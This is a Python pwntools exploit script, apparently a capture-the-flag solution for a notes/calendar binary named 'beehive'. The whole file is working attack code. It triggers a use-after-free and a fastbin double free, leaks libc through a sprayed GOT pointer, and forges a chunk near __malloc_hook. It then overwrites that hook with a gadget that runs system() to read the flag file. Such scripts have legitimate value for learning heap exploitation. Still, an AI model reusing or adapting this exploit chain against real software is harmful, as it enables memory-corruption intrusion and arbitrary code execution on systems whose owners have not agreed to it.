# -*- coding: utf-8 -*-
# @Author: madrat
# @Date:   2019-08-16 20:36:35

from pwn import *

local = True

context.terminal = ['tmux', 'splitw', '-v']

if local:
    elf = ELF('./../beehive_no_debug.out')
    ps = process('./../beehive_no_debug.out')
else:
    ps = remote('127.0.0.1', 1337)

'''
struct vector // Simple C struct as example (T is the type supplied by the template) 
{
    T *begin;        // vector::begin() probably returns this value
    T *end;          // vector::end()   probably returns this value
    T *end_capacity; // First non-valid address
    // Allocator state might be stored here (most allocators are stateless)
}
'''

signal_got = 0x60AF30

def view_notes():
    ps.sendline('view_notes')
    return ps.recvuntil('> ')

def select_date(month, day):
    time.sleep(0.08)
    ps.sendline('select_date')
    ps.recv()
    ps.sendline(str(month))
    ps.recv()
    ps.sendline(str(day))
    ps.recv()

def create_note(name, content, content_size):
    time.sleep(0.08)
    ps.sendline('create_note')
    ps.recv()
    ps.sendline(name)
    ps.recv()
    ps.sendline(str(content_size))
    ps.recv()
    ps.sendline(content)
    ps.recv()

def delete_note(idx):
    time.sleep(0.08)
    ps.sendline('delete_note')
    ps.recv()
    ps.sendline(str(idx))
    ps.recv()

def copy_notes(month, day):
    time.sleep(0.08)
    ps.sendline('copy_notes')
    ps.recv()
    ps.sendline(str(month))
    ps.recv()
    ps.sendline(str(day))
    ps.recv()

def double_free_fast():
    # first day
    select_date(2, 1)
    create_note('AAAA' * 31, 'BBBB' * 24, 600)
    create_note('BBBB' * 31, 'CCCC' * 24, 600)
    create_note('CCCC' * 31, 'DDDD' * 24, 600)
    create_note('DDDD' * 31, 'EEEE' * 24, 600)
    create_note('EEEE' * 31, 'FFFF' * 24, 600)
    create_note('FFFF' * 31, 'GGGG' * 24, 600)
    create_note('GGGG' * 31, 'HHHH' * 24, 600)
    create_note('HHHH' * 31, 'IIII' * 24, 600)
    create_note('IIII' * 31, 'JJJJ' * 24, 600)
    create_note('JJJJ' * 31, 'KKKK' * 24, 600)
    create_note('KKKK' * 31, 'LLLL' * 24, 600)
    create_note('LLLL' * 31, 'MMMM' * 24, 600)
    create_note('MMMM' * 31, 'NNNN' * 24, 600)
    copy_notes(2, 2)
    create_note('NNNN' * 31, 'OOOO' * 24, 600)

    # second day
    select_date(2, 3)
    create_note('AAAA' * 31, 'BBBB' * 24, 600)
    create_note('BBBB' * 31, 'CCCC' * 24, 600)
    create_note('CCCC' * 31, 'DDDD' * 24, 600)
    create_note('DDDD' * 31, 'EEEE' * 24, 600)
    create_note('EEEE' * 31, 'FFFF' * 24, 600)
    create_note('FFFF' * 31, 'GGGG' * 24, 600)
    create_note('GGGG' * 31, 'HHHH' * 24, 600)
    create_note('HHHH' * 31, 'IIII' * 24, 600)
    create_note('IIII' * 31, 'JJJJ' * 24, 600)
    create_note('JJJJ' * 31, 'KKKK' * 24, 600)
    create_note('KKKK' * 31, 'LLLL' * 24, 600)
    create_note('LLLL' * 31, 'MMMM' * 24, 600)
    create_note('MMMM' * 31, 'NNNN' * 24, 600)
    create_note('NNNN' * 31, 'OOOO' * 24, 600)

    # third day
    select_date(2, 2)
    create_note('NNNN' * 31, 'OOOO' * 24, 600)

def exploit_df_fast(chunk_to_get, size):
    select_date(2, 4)
    create_note('AAAAAAAA', p64(chunk_to_get) + 'A' * 38, size)
    create_note('ZZZZZZZZ' * 15, 'MMMMMMMM', size)
    create_note('XXXXXXXX' * 15, 'KKKKKKKK', size)

def generate_vec(cnt, content):
    for i in range(cnt):
        create_note('AAAAAAAA' * 15, content * 12, 100) # spray signal_got on heap to get leak

def generate_vec_param(cnt, name, content_size, content):
    for i in range(cnt):
        create_note(name, content, content_size)

def main():
    ps.recv()

    log.info('Trying to leak LIBC')
    log.info('Creating first vector at 1/1')
    generate_vec(13, p64(signal_got))
    log.info('Copy vector struct to 1/3 (UAF)')
    copy_notes(1, 3)
    log.info('Extend vector at 1/1 to free it')
    generate_vec(1, 'PPPPPPPP')   # free first vector

    log.info('Create vector at 1/2, and then free it to bypass "double free or corruption (fasttop)"')
    log.info('Adding notes with content == p64(signal_got)')
    log.info('Changing entries for vector at 1/3')
    select_date(1, 2)
    generate_vec(14, p64(signal_got))  # free second vector to bypass "double free or corruption (fasttop)" + sparay objects with .got['signal'] ptr's to leak libc

    log.info('Extending vector to move it to new location.')
    # log.info('Copied vector will contain edited data + bk/fd pointers, so we can use previously forged fake Day object and get memory leak')
    select_date(1, 3)
    create_note('AAAAAAAA', 'DDDDDDDD' * 17, 140) # double-free first vector + get leak

    log.info('Viewing notes in edited vector')
    leak = u64(view_notes()[560:560+6] + '\x00\x00') # leak
    data_base     = leak + 0x38ec40      # libc .data base 
    libc_base     = data_base - 0x3c4000 # libc .text base
    free_hook     = data_base + 0x27a8   # __free_hook
    malloc_hook   = data_base + 0xb10    # __malloc_hook
    fake_chunk_1  = data_base + 0x2795   # near __free_hook,   size 0x7f
    fake_chunk_2  = data_base + 0xb05    # near __malloc_hook, size 0x7f
    fake_chunk_3  = data_base + 0xaed    # near __malloc_hook, size 0x7f

    # none of the gadgets have not worked
    one_gadget_1 = libc_base + 0x45216 # rax == NULL
    one_gadget_2 = libc_base + 0x4526a # [rsp+0x30] == NULL
    one_gadget_3 = libc_base + 0xf02a4 # [rsp+0x50] == NULL
    one_gadget_4 = libc_base + 0xf1147 # [rsp+0x70] == NULL
    one_gadget_test = libc_base + 0x6F5A6

    binary_gadget = 0x405D4D # system("/bin/cat /service/flag.txt")

    system = libc_base + 0x44E20

    log.success('Libc leaked!')
    log.success('Libc address leak: 0x%x', leak)
    log.success('Libc .data base:   0x%x', data_base)
    log.success('Libc .text base:   0x%x', libc_base)
    log.success('__free_hook:       0x%x', free_hook)
    log.success('__malloc_hook:     0x%x', malloc_hook)

    log.success('Fakechunks near __free_hook:')
    log.failure('  1. size: 0x7f (doesn\'t work):  0x%x', fake_chunk_1)

    log.success('Fakechunks near __malloc_hook:')
    log.success('  1. size: 0x7f:  0x%x', fake_chunk_2)
    log.success('  2. size: 0x7f:  0x%x', fake_chunk_3)

    double_free_fast()

    select_date(2, 4)
    exploit_df_fast(fake_chunk_3, 102)

    create_note('AAAAAAAA', 'A' * 19 + p64(binary_gadget), 102) # rewrite malloc hook with gadget in binary, which will call system("/bin/cat /service/flag.txt")
    ps.interactive()

if __name__ == "__main__":
    main()
